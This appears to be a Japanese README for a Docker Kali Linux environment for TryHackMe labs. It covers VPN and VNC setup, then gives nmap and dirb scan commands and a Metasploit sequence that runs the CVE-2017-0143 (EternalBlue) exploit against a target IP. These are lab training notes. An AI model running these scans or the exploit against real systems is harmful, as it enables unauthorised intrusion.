## 準備
- TryHackMeのサイトから `tryhackme.ovpn` をダウンロードして、このディレクトリに配置する。

## 起動
```shell
$ docker compose up -d
```

## コンテナに入る
```shell
$ docker compose exec kali /bin/bash
```

## VPN接続
コンテナ内で実行する。

```shell
┌──(kali㉿xxxxx)-[~]
└─$ sudo openvpn tryhackme.ovpn

# これが表示されたらVPN接続成功
Initialization Sequence Completed
```

## コンテナを停止
```shell
$ docker compose down
```

## VNCサーバー起動
```shell
$ vncserver -localhost no
```

## ホストからVNCサーバーに接続
- Finderでサーバーへ接続
- `vnc://localhost:5901`
- `kalilinux`

## VNCサーバーを停止
```shell
# ディスプレイ番号を確認
$ vncserver -list

# ディスプレイ番号を指定して停止
$ vncserver -kill :1
```


## ポートスキャン
```shell
$ nmap -sV -Pn -oN nmap.txt -v $IP
```

## 公開されたディレクトリの検索
```shell
$ dirb http://$IP
```

## エクスプロイト
CVE-2017-0143の例

```shell
$ msfconsole

msf6 > search cve-2017-0143
msf6 > use 0
msf6 > set RHOSTS $IP
msf6 > set LHOST $LHOST
msf6 > exploit
```

